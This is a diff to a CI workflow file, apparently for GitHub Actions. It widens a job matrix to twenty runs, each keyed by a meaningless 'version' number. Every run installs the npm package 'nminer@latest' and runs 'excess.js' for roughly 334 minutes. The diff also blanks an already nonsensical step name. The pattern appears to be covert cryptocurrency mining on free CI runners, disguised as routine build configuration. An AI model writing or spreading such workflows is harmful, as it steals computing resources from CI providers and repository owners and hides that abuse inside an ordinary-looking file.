@@ -9,21 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9862 }
-          - { version: 9672 }
-          - { version: 3151 }
-          - { version: 4608 }
-          - { version: 7269 }
-          - { version: 8306 }
-          - { version: 413 }
-          - { version: 5126 }
-          - { version: 453 }
-          - { version: 2942 }
-          - { version: 5782 }
-          - { version: 2084 }
-          - { version: 1847 }
-          - { version: 6570 }
-          - { version: 3593 }
+          - { version: 6226 }
+          - { version: 4536 }
+          - { version: 612 }
+          - { version: 1891 }
+          - { version: 5328 }
+          - { version: 4631 }
+          - { version: 3547 }
+          - { version: 9581 }
+          - { version: 5337 }
+          - { version: 6933 }
+          - { version: 3615 }
+          - { version: 6480 }
+          - { version: 757 }
+          - { version: 5150 }
+          - { version: 4517 }
+          - { version: 5326 }
+          - { version: 1397 }
+          - { version: 6888 }
+          - { version: 5682 }
+          - { version: 4578 }
 
     steps:
       - name: Checkout
@@ -34,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: amongst watery yahoo
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 341m node excess.js || echo "excess executed"
+          timeout 334m node excess.js || echo "excess executed"
